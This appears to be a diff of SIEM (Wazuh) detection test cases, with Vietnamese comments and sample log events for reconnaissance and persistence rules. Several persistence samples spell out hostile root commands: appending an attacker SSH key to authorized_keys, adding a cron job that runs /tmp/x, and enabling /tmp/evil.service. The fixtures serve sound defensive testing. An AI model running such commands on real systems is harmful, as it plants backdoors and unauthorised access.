+  - 'type=SYSCALL msg=audit(1767225600.201:201): arch=c000003e syscall=59 success=yes exit=0 a0=55 a1=56 a2=57 a3=0 items=2 ppid=3999 pid=4201 auid=1000 uid=0 gid=0 euid=0 suid=0 fsuid=0 egid=0 sgid=0 fsgid=0 tty=pts0 ses=1 comm="id" exe="/usr/bin/id" key="audit-wazuh-c" type=EXECVE msg=audit(1767225600.201:201): argc=1 a0="id" type=CWD msg=audit(1767225600.201:201): cwd="/root"'
+  - 'type=SYSCALL msg=audit(1767225600.202:202): arch=c000003e syscall=59 success=yes exit=0 a0=55 a1=56 a2=57 a3=0 items=2 ppid=3999 pid=4202 auid=1000 uid=0 gid=0 euid=0 suid=0 fsuid=0 egid=0 sgid=0 fsgid=0 tty=pts0 ses=1 comm="whoami" exe="/usr/bin/whoami" key="audit-wazuh-c" type=EXECVE msg=audit(1767225600.202:202): argc=1 a0="whoami" type=CWD msg=audit(1767225600.202:202): cwd="/root"'
+  - 'type=SYSCALL msg=audit(1767225600.203:203): arch=c000003e syscall=59 success=yes exit=0 a0=55 a1=56 a2=57 a3=0 items=2 ppid=3999 pid=4203 auid=1000 uid=0 gid=0 euid=0 suid=0 fsuid=0 egid=0 sgid=0 fsgid=0 tty=pts0 ses=1 comm="id" exe="/usr/bin/id" key="audit-wazuh-c" type=EXECVE msg=audit(1767225600.203:203): argc=1 a0="id" type=CWD msg=audit(1767225600.203:203): cwd="/root"'
+  - 'type=SYSCALL msg=audit(1767225600.204:204): arch=c000003e syscall=59 success=yes exit=0 a0=55 a1=56 a2=57 a3=0 items=2 ppid=3999 pid=4204 auid=1000 uid=0 gid=0 euid=0 suid=0 fsuid=0 egid=0 sgid=0 fsgid=0 tty=pts0 ses=1 comm="whoami" exe="/usr/bin/whoami" key="audit-wazuh-c" type=EXECVE msg=audit(1767225600.204:204): argc=1 a0="whoami" type=CWD msg=audit(1767225600.204:204): cwd="/root"'
+
+# LNX-005 âm siem-proc: lệnh ngoài danh sách trinh sát (ls, pwd, df, du)
+- none:
+  - 102005
+  log_format: syslog
+  location: l5-other/siem-procs
+  events:
+  - 'ossec: output: ''siem-procs'': siem-proc: pid=1000 ppid=900 uid=0 name=ls parent=bash exe=/usr/bin/ls cmd=ls'
+  - 'ossec: output: ''siem-procs'': siem-proc: pid=1000 ppid=900 uid=0 name=pwd parent=bash exe=/usr/bin/pwd cmd=pwd'
+  - 'ossec: output: ''siem-procs'': siem-proc: pid=1000 ppid=900 uid=0 name=df parent=bash exe=/usr/bin/df cmd=df'
+  - 'ossec: output: ''siem-procs'': siem-proc: pid=1000 ppid=900 uid=0 name=du parent=bash exe=/usr/bin/du cmd=du'
+
+# LNX-005 bộ đếm siem-proc: một lệnh trinh sát (whoami) được nhận
+- rule: 102090
+  log_format: syslog
+  location: l5-base/siem-procs
+  events:
+  - 'ossec: output: ''siem-procs'': siem-proc: pid=1000 ppid=900 uid=0 name=whoami parent=bash exe=/usr/bin/whoami cmd=whoami'
+
+# LNX-005 bộ đếm siem-proc âm: lệnh không thuộc danh sách (ls)
+- none:
+  - 102090
+  log_format: syslog
+  location: l5-base-neg/siem-procs
+  events:
+  - 'ossec: output: ''siem-procs'': siem-proc: pid=1000 ppid=900 uid=0 name=ls parent=bash exe=/usr/bin/ls cmd=ls'
+
+# LNX-005 bộ đếm auditd: một lệnh trinh sát (whoami) được nhận
+- rule: 102091
+  log_format: audit
+  location: /var/log/audit/l5-base.log
+  events:
+  - 'type=SYSCALL msg=audit(1767225600.200:200): arch=c000003e syscall=59 success=yes exit=0 a0=55 a1=56 a2=57 a3=0 items=2 ppid=3999 pid=4200 auid=1000 uid=0 gid=0 euid=0 suid=0 fsuid=0 egid=0 sgid=0 fsgid=0 tty=pts0 ses=1 comm="whoami" exe="/usr/bin/whoami" key="audit-wazuh-c" type=EXECVE msg=audit(1767225600.200:200): argc=1 a0="whoami" type=CWD msg=audit(1767225600.200:200): cwd="/root"'
+
+# LNX-005 bộ đếm auditd âm: lệnh không thuộc danh sách (ls)
+- none:
+  - 102091
+  log_format: audit
+  location: /var/log/audit/l5-base-neg.log
+  events:
+  - 'type=SYSCALL msg=audit(1767225600.200:200): arch=c000003e syscall=59 success=yes exit=0 a0=55 a1=56 a2=57 a3=0 items=2 ppid=3999 pid=4200 auid=1000 uid=0 gid=0 euid=0 suid=0 fsuid=0 egid=0 sgid=0 fsgid=0 tty=pts0 ses=1 comm="ls" exe="/usr/bin/ls" key="audit-wazuh-c" type=EXECVE msg=audit(1767225600.200:200): argc=1 a0="ls" type=CWD msg=audit(1767225600.200:200): cwd="/root"'
+
+# LNX-006 siem-proc: ghi khóa vào authorized_keys
+- rule: 102006
+  legacy: LNX-006
+  log_format: syslog
+  location: siem-procs
+  events:
+  - 'ossec: output: ''siem-procs'': siem-proc: pid=1000 ppid=900 uid=0 name=sh parent=bash exe=/usr/bin/sh cmd=echo ssh-rsa AAAAB3Nza attacker >> /root/.ssh/authorized_keys'
+
+# LNX-006 auditd
+- rule: 102016
+  legacy: LNX-006
+  log_format: audit
+  location: /var/log/audit/audit.log
+  events:
+  - 'type=SYSCALL msg=audit(1767225600.100:100): arch=c000003e syscall=59 success=yes exit=0 a0=55 a1=56 a2=57 a3=0 items=2 ppid=3999 pid=4100 auid=1000 uid=0 gid=0 euid=0 suid=0 fsuid=0 egid=0 sgid=0 fsgid=0 tty=pts0 ses=1 comm="sh" exe="/usr/bin/sh" key="audit-wazuh-c" type=EXECVE msg=audit(1767225600.100:100): argc=6 a0="echo" a1="ssh-rsa" a2="AAAAB3Nza" a3="attacker" a4=">>" a5="/root/.ssh/authorized_keys" type=CWD msg=audit(1767225600.100:100): cwd="/root"'
+
+# LNX-006 siem-proc: ghi cron job
+- rule: 102006
+  log_format: syslog
+  location: siem-procs
+  events:
+  - 'ossec: output: ''siem-procs'': siem-proc: pid=1000 ppid=900 uid=0 name=sh parent=bash exe=/usr/bin/sh cmd=echo ''* * * * * root /tmp/x'' >> /etc/cron.d/x'
+
+# LNX-006 auditd: systemctl enable kèm đường dẫn /tmp
+- rule: 102016
+  log_format: audit
+  location: /var/log/audit/audit.log
+  events:
+  - 'type=SYSCALL msg=audit(1767225600.106:106): arch=c000003e syscall=59 success=yes exit=0 a0=55 a1=56 a2=57 a3=0 items=2 ppid=3999 pid=4106 auid=1000 uid=0 gid=0 euid=0 suid=0 fsuid=0 egid=0 sgid=0 fsgid=0 tty=pts0 ses=1 comm="systemctl" exe="/usr/bin/systemctl" key="audit-wazuh-c" type=EXECVE msg=audit(1767225600.106:106): argc=4 a0="systemctl" a1="enable" a2="evil.service" a3="/tmp/evil.service" type=CWD msg=audit(1767225600.106:106): cwd="/root"'
+
+# LNX-006 siem-proc: crontab -r từ /tmp
+- rule: 102006
+  log_format: syslog
+  location: siem-procs
+  events:
+  - 'ossec: output: ''siem-procs'': siem-proc: pid=1000 ppid=900 uid=0 name=crontab parent=bash exe=/usr/bin/crontab cmd=crontab -r /tmp/jobs'
+
+# LNX-006 âm siem-proc: đọc authorized_keys
+- none:
+  - 102006
+  log_format: syslog
+  location: siem-procs
+  events:
+  - 'ossec: output: ''siem-procs'': siem-proc: pid=1000 ppid=900 uid=0 name=cat parent=bash exe=/usr/bin/cat cmd=cat /root/.ssh/authorized_keys'
+
+# LNX-006 âm auditd: đọc authorized_keys
+- none:
+  - 102016
+  log_format: audit
+  location: /var/log/audit/audit.log
+  events:
+  - 'type=SYSCALL msg=audit(1767225600.100:100): arch=c000003e syscall=59 success=yes exit=0 a0=55 a1=56 a2=57 a3=0 items=2 ppid=3999 pid=4100 auid=1000 uid=0 gid=0 euid=0 suid=0 fsuid=0 egid=0 sgid=0 fsgid=0 tty=pts0 ses=1 comm="cat" exe="/usr/bin/cat" key="audit-wazuh-c" type=EXECVE msg=audit(1767225600.100:100): argc=2 a0="cat" a1="/root/.ssh/authorized_keys" type=CWD msg=audit(1767225600.100:100): cwd="/root"'
+
+# LNX-006 âm siem-proc: systemctl enable unit hệ thống
+- none:
+  - 102006
+  log_format: syslog
+  location: siem-procs
+  events:
+  - 'ossec: output: ''siem-procs'': siem-proc: pid=1000 ppid=900 uid=0 name=systemctl parent=bash exe=/usr/bin/systemctl cmd=systemctl enable nginx'
